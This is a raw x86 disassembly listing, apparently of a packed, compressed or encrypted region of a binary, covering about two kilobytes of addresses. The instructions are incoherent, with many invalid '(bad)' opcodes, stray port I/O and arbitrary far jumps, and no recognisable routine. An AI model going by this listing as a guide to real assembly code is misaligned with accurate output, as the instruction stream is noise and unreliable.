  4159bf:	aas    
  4159c0:	push   cs
  4159c1:	pop    esi
  4159c2:	mov    esi,0x7a33735f
  4159c7:	xchg   edx,eax
  4159c8:	pusha  
  4159c9:	xor    eax,edx
  4159cb:	loop   0x4159ec
  4159cd:	stos   DWORD PTR es:[edi],eax
  4159ce:	rol    DWORD PTR [edi-0x487c5e5c],cl
  4159d4:	stc    
  4159d5:	in     al,dx
  4159d6:	sbb    eax,0xb56b6a4b
  4159db:	mov    ebx,0x12167d27
  4159e0:	js     0x4159e5
  4159e2:	jg     0x415a2d
  4159e4:	pop    eax
  4159e5:	repnz sbb al,BYTE PTR [esi]
  4159e8:	cmp    edx,DWORD PTR [edx]
  4159ea:	cmp    ecx,DWORD PTR [ebx-0x52]
  4159ed:	(bad)  
  4159ee:	in     eax,dx
  4159ef:	mov    edx,0x8c5e4ba3
  4159f4:	scas   al,BYTE PTR es:[edi]
  4159f5:	sbb    BYTE PTR [ebx+0x46],dl
  4159f8:	repz push 0x9833bb4f
  4159fe:	enter  0x3051,0x81
  415a02:	in     al,dx
  415a03:	rcr    BYTE PTR [ecx-0x41],0x1b
  415a07:	cld    
  415a08:	shr    ah,0x9
  415a0b:	xchg   edi,eax
  415a0c:	pop    ebx
  415a0d:	cmc    
  415a0e:	and    BYTE PTR [ecx],dh
  415a10:	jp     0x415a06
  415a12:	xor    ebx,DWORD PTR [ebp+0x5e]
  415a15:	jp     0x415a31
  415a17:	in     al,dx
  415a18:	mov    esp,0x10bbae1f
  415a1d:	xchg   ah,ch
  415a1f:	jns    0x415a06
  415a21:	in     eax,dx
  415a22:	lock push ebp
  415a24:	faddp  st(4),st
  415a26:	xchg   esi,eax
  415a27:	ins    DWORD PTR es:[edi],dx
  415a28:	jg     0x415a6d
  415a2a:	pop    edi
  415a2b:	nop
  415a2c:	dec    esi
  415a2d:	sbb    eax,eax
  415a2f:	iret   
  415a30:	aas    
  415a31:	gs (bad) 
  415a35:	and    DWORD PTR [edx],esi
  415a37:	xor    BYTE PTR [ecx],ah
  415a39:	mov    gs,WORD PTR [ebp+0x1f]
  415a3c:	(bad)  
  415a3d:	pusha  
  415a3e:	xor    cl,dh
  415a40:	js     0x4159ec
  415a42:	or     dh,BYTE PTR [esi]
  415a44:	add    BYTE PTR [eax+edx*2-0x76],dl
  415a48:	sub    eax,0x9a40e5db
  415a4d:	ja     0x4159d6
  415a4f:	jp     0x415a75
  415a51:	lea    edx,[ecx+0x4225bcd5]
  415a57:	adc    eax,edx
  415a59:	test   eax,0x2b99d52e
  415a5e:	sbb    edx,edi
  415a60:	bound  esp,QWORD PTR [esi-0x1de8f10d]
  415a66:	dec    edi
  415a67:	popa   
  415a68:	ins    BYTE PTR es:[edi],dx
  415a69:	lahf   
  415a6a:	lods   al,BYTE PTR ds:[esi]
  415a6b:	test   al,0x49
  415a6d:	hlt    
  415a6e:	repnz mov dh,0xab
  415a71:	scas   al,BYTE PTR es:[edi]
  415a72:	jae    0x415a71
  415a74:	fisub  DWORD PTR [edi+0x11]
  415a77:	pop    ss
  415a78:	mov    ?,WORD PTR [ecx+0x5b666e6d]
  415a7e:	loopne 0x415ab4
  415a80:	mov    DWORD PTR [ebx],0x39850fce
  415a86:	fdiv   st(7),st
  415a88:	dec    DWORD PTR [ebx-0x73751fb3]
  415a8e:	or     eax,0xffffff5c
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	add    eax,0x4e39d71c
  415ab4:	push   edi
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415a63
  415abc:	adc    al,0xa6
  415abe:	pushf  
  415abf:	mov    bh,0xef
  415ac1:	scas   al,BYTE PTR es:[edi]
  415ac2:	popf   
  415ac3:	lahf   
  415ac4:	lods   eax,DWORD PTR ds:[esi]
  415ac5:	aaa    
  415ac6:	and    bh,cl
  415ac8:	cmp    DWORD PTR [esp+edi*2],ecx
  415acb:	adc    ebx,DWORD PTR [ecx]
  415acd:	ja     0x415b23
  415acf:	cmp    eax,0xc105c1b9
  415ad4:	in     al,dx
  415ad5:	(bad)  
  415ad6:	in     eax,0xef
  415ad8:	xor    eax,0xb199d1b9
  415add:	outs   dx,BYTE PTR ds:[esi]
  415ade:	popf   
  415adf:	adc    eax,0xd7276871
  415ae4:	cmp    bh,BYTE PTR cs:[ecx+0x74]
  415ae8:	xchg   BYTE PTR [edx-0x392edb74],al
  415aee:	ret    
  415aef:	adc    DWORD PTR [esi],eax
  415af1:	arpl   WORD PTR [ebx],di
  415af3:	jne    0x415b1f
  415af5:	mov    edx,0xef861d19
  415afa:	mov    eax,0x6d28e390
  415aff:	dec    esp
  415b00:	nop
  415b01:	out    0x2,eax
  415b03:	jb     0x415a8f
  415b05:	repnz cmp DWORD PTR [ebx-0x7204dcdf],eax
  415b0c:	fistp  WORD PTR [edi+0xdaf5efb]
  415b12:	cmp    al,0x2
  415b14:	test   BYTE PTR [edi+0x3a],cl
  415b17:	mov    ecx,0x8e013f
  415b1c:	les    ecx,FWORD PTR [esi+edi*8-0x6b989f47]
  415b23:	push   edi
  415b24:	jnp    0x415af3
  415b26:	inc    ecx
  415b27:	add    esp,edi
  415b29:	mov    ah,0x83
  415b2b:	mov    ebx,0x5c2d4cec
  415b30:	fcmovnbe st,st(6)
  415b32:	cs jne 0x415b0b
  415b35:	nop
  415b36:	add    dl,BYTE PTR [eax+0x2d5def48]
  415b3c:	pop    ecx
  415b3d:	inc    al
  415b3f:	push   ecx
  415b40:	pop    ebx
  415b41:	fist   WORD PTR [ebp+0x21]
  415b44:	in     eax,0x60
  415b46:	cmp    al,0xc1
  415b48:	lods   al,BYTE PTR ds:[esi]
  415b49:	xchg   edi,eax
  415b4a:	retf   0xcd7a
  415b4d:	xchg   bl,bh
  415b4f:	jbe    0x415b9d
  415b51:	sub    DWORD PTR [edx+0x2],ecx
  415b54:	push   eax
  415b55:	sar    ah,1
  415b57:	repnz pop ss
  415b59:	or     eax,0xc9c61511
  415b5e:	(bad)
  415b61:	lock aam 0xf0
  415b64:	popf   
  415b65:	ret    
  415b66:	ror    DWORD PTR [ebx+0x60],1
  415b69:	xchg   ebp,eax
  415b6a:	push   ds
  415b6b:	adc    ch,dh
  415b6d:	mov    es,WORD PTR [ebx-0x1bc626f]
  415b73:	add    eax,0x618ea01c
  415b78:	sti    
  415b79:	dec    edi
  415b7a:	sub    eax,DWORD PTR [eax-0xa]
  415b7d:	add    eax,0xbb8a70e3
  415b82:	or     esp,DWORD PTR [eax-0x75]
  415b85:	lahf   
  415b86:	lea    ecx,[eax-0x7f52c692]
  415b8c:	pusha  
  415b8d:	xchg   ebx,eax
  415b8e:	lock sub BYTE PTR [esi],bh
  415b91:	ja     0x415be1
  415b93:	or     eax,edi
  415b95:	dec    ecx
  415b96:	imul   ebp,DWORD PTR [ebp+0x57],0xffffff9c
  415b9a:	pop    ebx
  415b9b:	mov    cl,BYTE PTR [ecx-0xc37a789]
  415ba1:	or     BYTE PTR [ebx-0x74],ah
  415ba4:	retf   
  415ba5:	inc    edx
  415ba6:	jmp    0x7de4:0xbf3b2246
  415bad:	das    
  415bae:	xor    al,BYTE PTR [edi-0x63]
  415bb1:	(bad)  
  415bb2:	cmp    al,0x1e
  415bb4:	pop    ss
  415bb5:	addr16 jg 0x415bf1
  415bb8:	mov    BYTE PTR [edi],cl
  415bba:	mov    edi,0xd67e5e97
  415bbf:	mov    WORD PTR ds:0x8a47ef63,gs
  415bc5:	dec    ebp
  415bc6:	pop    ebx
  415bc7:	mov    edx,DWORD PTR [eax]
  415bc9:	sbb    al,BYTE PTR [edx]
  415bcb:	(bad)  
  415bcc:	cli    
  415bcd:	xchg   edi,eax
  415bce:	mov    es,esp
  415bd0:	sbb    eax,0x1a97b323
  415bd5:	rcr    DWORD PTR [edi-0x68b584e0],1
  415bdb:	pop    es
  415bdc:	jo     0x415b82
  415bde:	inc    edi
  415bdf:	ret    
  415be0:	adc    BYTE PTR [eax],bl
  415be2:	mov    ds:0xe9d0b11f,al
  415be7:	daa    
  415be8:	inc    ax
  415bea:	iret   
  415beb:	cmp    bl,BYTE PTR [ecx]
  415bed:	push   0x1c484e32
  415bf2:	(bad)  
  415bf5:	or     dh,bl
  415bf7:	test   eax,0x5c03b0cb
  415bfc:	scas   eax,DWORD PTR es:[edi]
  415bfd:	xchg   BYTE PTR ds:0xf9acbabf,ah
  415c03:	hlt    
  415c04:	scas   eax,DWORD PTR es:[edi]
  415c05:	imul   edi,esp,0x6
  415c08:	xchg   ecx,eax
  415c09:	push   es
  415c0a:	cmc    
  415c0b:	pop    ebx
  415c0c:	adc    edi,ebp
  415c0e:	call   0xf97f6c4f
  415c13:	dec    ecx
  415c14:	(bad)  
  415c16:	test   eax,0x1838e53b
  415c1b:	push   ebx
  415c1c:	pop    edx
  415c1d:	dec    edi
  415c1e:	outs   dx,DWORD PTR ds:[esi]
  415c1f:	xor    BYTE PTR [eax-0x78],al
  415c22:	mov    cl,0xd5
  415c24:	push   edi
  415c25:	aad    0x7c
  415c27:	mov    bl,0x45
  415c29:	or     DWORD PTR [ecx],edx
  415c2b:	sub    cl,BYTE PTR [ecx]
  415c2d:	lods   al,BYTE PTR ds:[esi]
  415c2e:	sub    cl,BYTE PTR [ebp+0x2b989305]
  415c34:	push   esp
  415c35:	(bad)  
  415c36:	adc    ah,BYTE PTR [esi]
  415c38:	js     0x415c54
  415c3a:	scas   eax,DWORD PTR es:[edi]
  415c3b:	pusha  
  415c3c:	test   al,0xc0
  415c3e:	xor    BYTE PTR [ebx],dh
  415c40:	mov    WORD PTR [esp+edx*4+0xf5512a],es
  415c47:	inc    ecx
  415c48:	hlt    
  415c49:	pop    edi
  415c4a:	fwait
  415c4b:	xchg   BYTE PTR cs:[eax+edi*1+0x2478d9d3],cl
  415c53:	dec    ecx
  415c54:	inc    eax
  415c55:	xor    DWORD PTR [esi-0x77b542b7],0x7d9c8686
  415c5f:	out    dx,eax
  415c60:	leave  
  415c61:	fidivr WORD PTR [ebp+0x4841b017]
  415c67:	mov    cl,BYTE PTR [ecx-0x5]
  415c6a:	(bad)  
  415c6b:	shl    BYTE PTR [esi-0x20],cl
  415c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c6f:	xchg   BYTE PTR [esi],dl
  415c71:	jb     0x415c81
  415c73:	adc    DWORD PTR [ebx-0x2a6b53ca],eax
  415c79:	sahf   
  415c7a:	sub    ah,dl
  415c7c:	cmp    dh,BYTE PTR ds:0x5a79f497
  415c82:	retf   0x7765
  415c85:	jno    0x6526b5cb
  415c8b:	dec    edi
  415c8c:	out    dx,al
  415c8d:	call   0x8dff:0xfb004802
  415c94:	inc    edi
  415c95:	dec    eax
  415c96:	xor    eax,0x5c32d3bb
  415c9b:	js     0x415c85
  415c9d:	int3   
  415c9e:	test   al,0xd3
  415ca0:	jp     0x415d07
  415ca2:	sub    bl,BYTE PTR [ebx-0x78a3d26e]
  415ca8:	ss fiadd WORD PTR gs:[esi+0x66]
  415cad:	sbb    BYTE PTR [eax+0x19],bl
  415cb0:	dec    edi
  415cb1:	or     al,0x1c
  415cb3:	mov    eax,ds:0x303bca51
  415cb8:	push   0x44e038bf
  415cbd:	adc    al,BYTE PTR [eax+0x210f17f4]
  415cc3:	iret   
  415cc4:	outs   dx,DWORD PTR ds:[esi]
  415cc5:	out    dx,eax
  415cc6:	pusha  
  415cc7:	popa   
  415cc8:	lahf   
  415cc9:	xchg   esi,eax
  415cca:	sahf   
  415ccb:	arpl   dx,di
  415ccd:	lahf   
  415cce:	(bad)  
  415ccf:	in     al,0x94
  415cd1:	xchg   ebp,eax
  415cd2:	inc    esp
  415cd3:	call   0x23a8:0x137593fe
  415cda:	test   BYTE PTR [eax+ecx*2+0x3c],bl
  415cde:	push   ebp
  415cdf:	pop    edx
  415ce0:	mov    ebp,0xbb843904
  415ce5:	xor    dl,dl
  415ce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ce8:	test   BYTE PTR [edi-0x2b],dh
  415ceb:	fdivr  QWORD PTR ds:0x8de1e55e
  415cf1:	mov    esp,0xc635c0f0
  415cf6:	mov    edx,eax
  415cf8:	or     DWORD PTR ds:[edx-0x9],edi
  415cfc:	jp     0x415d3c
  415cfe:	aad    0x51
  415d00:	xchg   esp,eax
  415d01:	cwde   
  415d02:	xchg   esp,eax
  415d03:	pusha  
  415d04:	or     ebp,edx
  415d06:	in     al,dx
  415d07:	inc    esi
  415d08:	or     eax,0xe144485a
  415d0d:	arpl   WORD PTR ds:0x81e26801,bx
  415d13:	or     DWORD PTR [ebx],0x6a87ed38
  415d19:	mov    esi,0x3155629
  415d1e:	jmp    0xb3cba4b8
  415d23:	test   esp,edx
  415d25:	lock aaa 
  415d27:	adc    DWORD PTR [edi*8-0x19d4b96b],edx
  415d2e:	retf   
  415d2f:	inc    bx
  415d31:	dec    ecx
  415d32:	out    dx,eax
  415d33:	xchg   edx,eax
  415d34:	adc    eax,0x53e04e32
  415d39:	add    DWORD PTR [ebx+0x3999eb90],ebp
  415d3f:	xor    DWORD PTR [ebp+edx*1+0x38],esi
  415d43:	in     al,dx
  415d44:	mov    ds:0xe250ae57,eax
  415d49:	mov    edi,0x3f43d1bd
  415d4e:	mov    ah,0x91
  415d50:	or     dh,cl
  415d52:	data16 jecxz 0x415d43
  415d55:	popa   
  415d56:	stos   DWORD PTR es:[edi],eax
  415d57:	xlat   BYTE PTR ds:[ebx]
  415d58:	loopne 0x415dbd
  415d5a:	mov    ds:0xade6552f,eax
  415d5f:	xor    esp,DWORD PTR ds:0x671af8b7
  415d65:	aam    0xe1
  415d67:	daa    
  415d68:	adc    eax,0x8da925e6
  415d6d:	and    DWORD PTR [ebx+0x652b98c0],edx
  415d73:	inc    ebx
  415d74:	jle    0x415daa
  415d76:	test   al,0x9f
  415d78:	jns    0x415d19
  415d7a:	ja     0x415da7
  415d7c:	stc    
  415d7d:	in     eax,0xf
  415d7f:	sub    al,0x99
  415d81:	fs jge 0x415de6
  415d84:	int3   
  415d85:	pop    ebx
  415d86:	int3   
  415d87:	mov    al,0x20
  415d89:	jmp    0x796:0x7dfb684d
  415d90:	xchg   esi,eax
  415d91:	mov    edx,0xde3c3ccf
  415d96:	inc    edi
  415d97:	std    
  415d98:	js     0x415d4b
  415d9a:	inc    edi
  415d9b:	pushf  
  415d9c:	mov    WORD PTR [eax+ecx*4],ds
  415d9f:	sbb    eax,0xd3e0fa28
  415da4:	dec    ebx
  415da5:	fs js  0x415e24
  415da8:	outs   dx,DWORD PTR ds:[esi]
  415da9:	std    
  415daa:	jbe    0x415df3
  415dac:	rol    dl,1
  415dae:	fistp  QWORD PTR [edx]
  415db0:	sbb    edi,edi
  415db2:	int3   
  415db3:	es pop ebp
  415db5:	mov    ah,0x58
  415db7:	and    ch,BYTE PTR [ebx+0x44]
  415dba:	push   DWORD PTR [esp+esi*8+0x72]
  415dbe:	push   0x33d6ffbb
  415dc3:	lock pop edx
  415dc5:	enter  0xefa0,0x48
  415dc9:	xchg   ebx,eax
  415dca:	ja     0x415dd9
  415dcc:	data16 (bad) 
  415dce:	xchg   esp,eax
  415dcf:	push   edx
  415dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dd1:	bound  eax,QWORD PTR [ecx-0x7199e9e7]
  415dd7:	inc    ebp
  415dd8:	stos   BYTE PTR es:[edi],al
  415dd9:	imul   eax
  415ddb:	cdq    
  415ddc:	add    eax,0xffdcee93
  415de1:	das    
  415de2:	test   BYTE PTR [esi],dl
  415de4:	scas   eax,DWORD PTR es:[edi]
  415de5:	mov    ds:0x56dfdf84,al
  415dea:	(bad)
  415ded:	dec    edx
  415dee:	cmp    al,0xde
  415df0:	sub    dl,BYTE PTR [ebx]
  415df2:	loop   0x415dc4
  415df4:	mov    ebx,DWORD PTR [edx+0x1c]
  415df7:	ins    DWORD PTR es:[edi],dx
  415df8:	sub    DWORD PTR [ebx+0x3f6464cd],0x648d3911
  415e02:	push   esp
  415e03:	cmp    ecx,esp
  415e05:	cdq    
  415e06:	mov    dl,0x52
  415e08:	cmp    eax,0xb7e74e88
  415e0d:	mov    esp,0xbd995e13
  415e12:	cmp    esp,DWORD PTR [edi+0x43090148]
  415e18:	cli    
  415e19:	and    bl,dh
  415e1b:	fdiv   QWORD PTR [ecx]
  415e1d:	rcr    edi,1
  415e1f:	xchg   edi,eax
  415e20:	and    DWORD PTR [edx+0x6349619f],0xde81b5ef
  415e2a:	mov    DWORD PTR ds:0xb948dbcf,0xde2c04a8
  415e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e35:	addr16 sti 
  415e37:	call   0x709e:0xb128e25c
  415e3e:	cwde   
  415e3f:	inc    edx
  415e40:	mov    dh,ch
  415e42:	inc    ebp
  415e43:	pop    ds
  415e44:	mov    al,0x9a
  415e46:	or     ch,ah
  415e48:	push   ecx
  415e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e4a:	dec    esi
  415e4b:	sbb    DWORD PTR [eax-0x9],edi
  415e4e:	mov    edx,0xd6dd4fb6
  415e53:	dec    esi
  415e54:	test   BYTE PTR [edx+0x64ab005e],al
  415e5a:	aam    0x75
  415e5c:	jge    0x415df6
  415e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5f:	inc    ebx
  415e60:	cmc    
  415e61:	repz rcl BYTE PTR [ecx+0x14d39fe5],0xdd
  415e69:	mov    edi,0x6f7e16de
  415e6e:	ror    eax,0x5b
  415e71:	hlt    
  415e72:	scas   eax,DWORD PTR es:[edi]
  415e73:	call   0x78f4e5c6
  415e78:	pop    ecx
  415e79:	jno    0x415e09
  415e7b:	ins    BYTE PTR es:[edi],dx
  415e7c:	mov    edx,ebp
  415e7e:	xor    ecx,esi
  415e80:	add    BYTE PTR ds:0x7ce0c5aa,0xfd
  415e87:	jge    0x415ea7
  415e89:	call   0xe04420b4
  415e8e:	mov    ecx,0xbba7aafe
  415e93:	aad    0x38
  415e95:	mov    ds:0x19742497,al
  415e9a:	ja     0x415ea3
  415e9c:	xchg   edi,eax
  415e9d:	push   edi
  415e9e:	jbe    0x415e27
  415ea0:	mov    fs,WORD PTR [edi]
  415ea2:	gs push 0x4c788243
  415ea8:	inc    edi
  415ea9:	jo     0x415e2e
  415eab:	bound  ecx,QWORD PTR [eax]
  415ead:	dec    edi
  415eae:	ret    
  415eaf:	push   ebp
  415eb0:	test   DWORD PTR [eax],ecx
  415eb2:	dec    ebx
  415eb3:	jmp    0x5552:0xe97acb6e
  415eba:	call   0x27f9d101
  415ebf:	dec    BYTE PTR [edi+0x2b]
  415ec2:	mov    ebx,0xd9a759db
  415ec7:	add    ah,0x42
  415eca:	sti    
  415ecb:	jb     0x415e60
  415ecd:	xor    BYTE PTR [eax-0x6b],bl
  415ed0:	adc    edi,DWORD PTR [eax+0x6e8b9f45]
  415ed6:	mov    edx,0xdf9b979f
  415edb:	or     BYTE PTR [esi-0x79],0xf4
  415edf:	stc    
  415ee0:	lea    eax,[edi-0x7a1f92fb]
  415ee6:	push   edi
  415ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ee8:	dec    edx
  415ee9:	loope  0x415f2a
  415eeb:	cs dec esi
  415eed:	pop    ecx
  415eee:	cmc    
  415eef:	dec    esi
  415ef0:	test   BYTE PTR [eax+0x7e],bh
  415ef3:	std    
  415ef4:	dec    edx
  415ef5:	(bad)  
  415ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef8:	inc    ecx
  415ef9:	into   
  415efa:	jb     0x415f73
  415efc:	repnz add ecx,DWORD PTR [edi]
  415eff:	sbb    BYTE PTR [ecx],ah
  415f01:	mov    esp,0xdd99bcbe
  415f06:	cli    
  415f07:	xchg   ecx,eax
  415f08:	out    0x85,al
  415f0a:	xor    eax,0x3aa30436
  415f0f:	inc    eax
  415f10:	mov    esi,0x91b0a38c
  415f15:	lock dec edx
  415f17:	in     al,0xfe
  415f19:	jbe    0x415e9f
  415f1b:	pop    es
  415f1c:	retf   0x17fa
  415f1f:	test   eax,0x7f78f310
  415f24:	mov    ah,0x90
  415f26:	fnstcw WORD PTR [ebx-0x7c6e7d4d]
  415f2c:	or     ecx,esp
  415f2e:	loop   0x415edc
  415f30:	leave  
  415f31:	cmp    BYTE PTR [ebp+0x56],0x7c
  415f35:	in     eax,0x61
  415f37:	fist   WORD PTR [ecx+edi*1-0x60]
  415f3b:	push   eax
  415f3c:	ja     0x415ee1
  415f3e:	(bad)  
  415f3f:	sbb    esp,DWORD PTR [eax-0x62e985f3]
  415f45:	inc    esp
  415f46:	scas   eax,DWORD PTR es:[edi]
  415f47:	or     BYTE PTR [ebx],0xd2
  415f4a:	xor    ecx,edx
  415f4c:	add    al,0x8c
  415f4e:	xor    ebx,DWORD PTR [eax+ebx*4]
  415f51:	rol    ebp,cl
  415f53:	xchg   ebx,eax
  415f54:	mov    ebp,gs
  415f56:	test   ax,0xdaf3
  415f5a:	add    BYTE PTR [eiz*1+0x111447ad],bl
  415f61:	(bad)  
  415f62:	fld    QWORD PTR [eax]
  415f64:	call   esi
  415f66:	icebp  
  415f67:	mov    ds:0xd1eedb1c,al
  415f6c:	pop    es
  415f6d:	sbb    al,0x56
  415f6f:	inc    esp
  415f70:	add    BYTE PTR [eax+0x71],ch
  415f73:	pop    edi
  415f74:	and    eax,0xb167fcf5
  415f79:	sbb    eax,0xf92aee29
  415f7e:	pop    edi
  415f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f80:	cmp    bh,BYTE PTR [edx]
  415f82:	mov    edx,0x131e9b34
  415f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f88:	test   BYTE PTR [ecx-0x12],ch
  415f8b:	je     0x415f1e
  415f8d:	(bad)
  415f90:	fisubr DWORD PTR [ecx]
  415f92:	mov    al,0xb3
  415f94:	lahf   
  415f95:	cmp    DWORD PTR [ecx+0x72],eax
  415f98:	imul   ecx,DWORD PTR [eax],0x38
  415f9b:	aaa    
  415f9c:	and    al,BYTE PTR [edi]
  415f9e:	fs sbb al,0x29
  415fa1:	add    eax,0xfe327218
  415fa6:	push   ebp
  415fa7:	jno    0x416008
  415fa9:	fcmovne st,st(4)
  415fab:	sbb    BYTE PTR fs:[ebp+0x7535f489],dl
  415fb2:	inc    edx
  415fb3:	cmp    esp,DWORD PTR gs:[ebp-0x61a85f2f]
  415fba:	mov    ch,0xd1
  415fbc:	jl     0x415f9c
  415fbe:	arpl   WORD PTR [ebx+eiz*4-0x19],si
  415fc2:	jl     0x415fef
  415fc4:	arpl   WORD PTR [ecx],bp
  415fc6:	daa    
  415fc7:	(bad)  
  415fc8:	xchg   edx,eax
  415fc9:	jg     0x415fa0
  415fcb:	adc    BYTE PTR [edx+0x3808d693],dh
  415fd1:	scas   al,BYTE PTR es:[edi]
  415fd2:	mov    ds:0xcb8e5e60,eax
  415fd7:	xchg   DWORD PTR ds:0xe0211e2a,ebx
  415fdd:	jle    0x415ff2
  415fdf:	popf   
  415fe0:	int    0xe6
  415fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fe3:	jnp    0x41604e
  415fe5:	shr    DWORD PTR [ebx-0x78],cl
  415fe8:	mov    esp,0x477a2959
  415fed:	and    ebx,DWORD PTR [ebx-0x7f]
  415ff0:	arpl   cx,si
  415ff2:	add    al,0xc5
  415ff4:	in     eax,dx
  415ff5:	xor    DWORD PTR [edi],edi
  415ff7:	mov    ebx,edi
  415ff9:	push   edx
  415ffa:	sub    dl,cl
  415ffc:	xchg   esp,eax
  415ffd:	shl    DWORD PTR [edx],0xc5
  416000:	xlat   BYTE PTR ds:[ebx]
  416001:	(bad)  
  416003:	push   esi
  416004:	pop    ss
  416005:	test   eax,0x224d5a3
  41600a:	loope  0x415fa9
  41600c:	pop    eax
  41600d:	int3   
  41600e:	sbb    BYTE PTR [ebx-0x3213aee3],dh
  416014:	jl     0x416080
  416016:	ins    BYTE PTR es:[edi],dx
  416017:	xchg   esi,eax
  416018:	add    al,0xff
  41601a:	dec    esi
  41601b:	jbe    0x41608b
  41601d:	mov    ds:0xcea35d92,al
  416022:	mov    ebp,0xa2014e9b
  416027:	addr16 pop edi
  416029:	and    BYTE PTR [edi+0x4],0xbb
  41602d:	jb     0x415ff9
  41602f:	xor    eax,0x4e6278b6
  416034:	and    DWORD PTR [ebx],ecx
  416036:	rcl    DWORD PTR ds:[edx+ebp*8-0x6faef217],0x8b
  41603f:	xchg   ebp,eax
  416040:	test   bl,bl
  416042:	jbe    0x415fda
  416044:	push   esi
  416045:	fs and eax,0xc7593c9
  41604b:	test   al,0xe8
  41604d:	jle    0x416093
  41604f:	jmp    0x416025
  416051:	(bad)  
  416052:	aad    0xe0
  416054:	push   ebp
  416055:	leave  
  416056:	(bad)  
  416057:	ins    BYTE PTR es:[edi],dx
  416058:	das    
  416059:	retf   
  41605a:	je     0x416086
  41605c:	arpl   WORD PTR [ebx+0x2d40a706],ax
  416062:	or     DWORD PTR [edi+ebx*1+0x25],0x5a
  416067:	ror    DWORD PTR [edi],1
  416069:	adc    BYTE PTR [esi+0x67eee33c],0xb1
  416070:	mov    ah,0xbc
  416072:	not    DWORD PTR [esi-0x78d8646c]
  416078:	mov    ebp,0x4dacf501
  41607d:	loop   0x41603d
  41607f:	repnz sbb al,0xc2
  416082:	dec    ebx
  416083:	jne    0x41606c
  416085:	(bad)  
  416086:	ins    DWORD PTR es:[edi],dx
  416087:	ret    0x5d85
  41608a:	mul    DWORD PTR ds:0xaac37777
  416090:	and    eax,0xa667641f
  416095:	jge    0x4160fd
  416097:	xchg   esi,eax
  416098:	cmp    BYTE PTR [edi],ah
  41609a:	xchg   edx,eax
  41609b:	sbb    eax,0x9fef810
  4160a0:	cs mov eax,0xaf3014e
  4160a6:	(bad)  
  4160a7:	jmp    0xa1fe:0xcf840a9d
  4160ae:	popa   
  4160af:	inc    esi
  4160b0:	daa    
  4160b1:	xchg   ecx,eax
  4160b2:	inc    esp
  4160b3:	data16 jle 0x4160b8
  4160b6:	cmp    DWORD PTR [ebx],ebp
  4160b8:	pop    esp
  4160b9:	std    
  4160ba:	scas   al,BYTE PTR es:[edi]
  4160bb:	xchg   edi,eax
  4160bc:	mov    cl,0x88
  4160be:	js     0x416113
  4160c0:	adc    al,0xa7
  4160c2:	test   al,0xcf
  4160c4:	sub    dl,BYTE PTR [edx+0x525c0608]
  4160ca:	enter  0x7023,0xe5
  4160ce:	mov    WORD PTR [ecx],ds
  4160d0:	inc    edx
  4160d1:	sbb    BYTE PTR [ebp+0x2ab5faba],0x70
  4160d8:	fcomip st,st(4)
  4160da:	int3   
  4160db:	mov    bh,0xcd
  4160dd:	or     eax,0x1b288388
  4160e2:	inc    ecx
  4160e3:	ja     0x4160d3
  4160e5:	mov    ebp,0x38c6afd3
  4160ea:	imul   edx,DWORD PTR [edx+ebp*4-0x2e9bc3],0x36b25f93
  4160f5:	xchg   edx,eax
  4160f6:	ins    DWORD PTR es:[edi],dx
  4160f7:	mov    edx,0xaaf21d54
  4160fc:	push   ebx
  4160fd:	xor    BYTE PTR [esi],al
  4160ff:	call   0xd53c:0x29097f3e
  416106:	mov    ebx,0xc284893e
  41610b:	dec    ecx
  41610c:	sbb    BYTE PTR [ebx],ch
  41610e:	dec    esp
  41610f:	xchg   esi,eax
  416110:	jmp    0xc034d761
  416115:	adc    edi,DWORD PTR [eax]
  416117:	dec    esp
  416118:	cs add bl,al
  41611b:	xchg   esi,eax
  41611c:	xchg   esp,eax
  41611d:	aad    0xf5
  41611f:	xchg   esi,eax
  416120:	mov    BYTE PTR [ecx],dl
  416122:	mov    bl,0x36
  416124:	sar    ebp,0x85
  416127:	or     dh,BYTE PTR [ebx-0x65]
  41612a:	add    cl,BYTE PTR [edx+ebx*2+0x1adab64a]
  416131:	sbb    ecx,esp
  416133:	sbb    BYTE PTR [ebx+0x46720b28],0xec
  41613a:	adc    BYTE PTR ds:0x2df1b3ee,bh
  416140:	sbb    dh,BYTE PTR [ecx-0x11]
  416143:	fistp  DWORD PTR [edx-0x70]
  416146:	imul   ecx,DWORD PTR [edx+eax*4-0x34ee8711],0xffffffb2
  41614e:	cmp    al,cl
  416150:	sbb    ch,BYTE PTR [ebx+0x5d]
  416153:	or     eax,0xa64ec1a
  416158:	mov    ecx,esi
  41615a:	jne    0x416166
  41615c:	lock and cl,BYTE PTR gs:[edi]
  416160:	pusha  
  416161:	pop    ebp
  416162:	test   edi,ebp
  416164:	push   0x12fc83b0
  416169:	push   ebp
  41616a:	mov    ecx,0xad94de5f
  41616f:	sub    eax,0xc4714226
  416174:	mov    esi,0xde467484
  416179:	(bad)  
  41617a:	mov    cl,0xdd
  41617c:	jmp    0x3bb606a3
  416181:	inc    ebp
  416182:	jp     0x416140
  416184:	aad    0xf7
  416186:	cmp    BYTE PTR cs:0xeea85f0d,ch
  41618d:	(bad)  
  41618e:	(bad)  
  41618f:	xor    al,0x1b
  416191:	xchg   ebp,eax
  416192:	jno    0x4161fc
  416194:	xchg   ecx,eax
  416195:	(bad)  
  416196:	pop    ebx
  416197:	push   0xffffffce
  416199:	mov    esi,eax
  41619b:	iret   
  41619c:	shr    BYTE PTR [edx+0x3dcb7f46],0xad
  4161a3:	cmp    cl,ch
  4161a5:	dec    ecx
  4161a6:	in     eax,0xda
  4161a8:	cmp    DWORD PTR [eax],esp
  4161aa:	push   cs
